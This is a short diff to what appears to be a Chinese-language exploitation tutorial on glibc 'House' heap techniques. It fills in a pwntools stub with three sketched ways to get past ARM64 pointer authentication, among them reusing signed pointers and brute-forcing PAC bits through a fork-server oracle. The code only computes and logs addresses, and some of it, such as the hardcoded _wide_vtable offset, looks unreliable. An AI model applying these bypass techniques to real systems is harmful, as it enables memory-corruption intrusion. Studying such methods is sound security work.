@@ -306,7 +306,24 @@ def hardware_house_bypass():
     # 函数指针需要合法的 PAC 签名
     # House of Apple 2 通过 _wide_vtable 间接调用
     # 需要确保 _wide_vtable 中的函数指针有效
-    pass
+    
+    # PAC 绕过实战代码
+    from pwn import *
+    context.arch = 'aarch64'
+    
+    # 方法 1: 从内存中读取已签名的合法指针并复用
+    # 例如从 GOT 表中读取 __libc_start_main 的已签名地址
+    signed_ptr = libc_base + libc.symbols['__libc_start_main']  # 已有合法 PAC
+    
+    # 方法 2: 利用 PAC oracle 侧信道暴力破解 PAC 值
+    # 签名位通常只有 16-32 bit，可以暴力尝试
+    # 注意：每次失败可能触发异常，需要 fork 服务器模式
+    
+    # 方法 3: 利用 _wide_vtable 绕过
+    # _wide_vtable 中的函数指针在 House of Apple 路径中被间接调用
+    # 如果 _wide_data->_wide_vtable 是可控的，可以选择已签名的函数
+    _wide_vtable_addr = libc_base + 0x218000  # _wide_vtable 偏移
+    log.info(f"PAC bypass: use _wide_vtable at {hex(_wide_vtable_addr)}")
 ```
 
 ### 4. 沙箱环境 House 系列
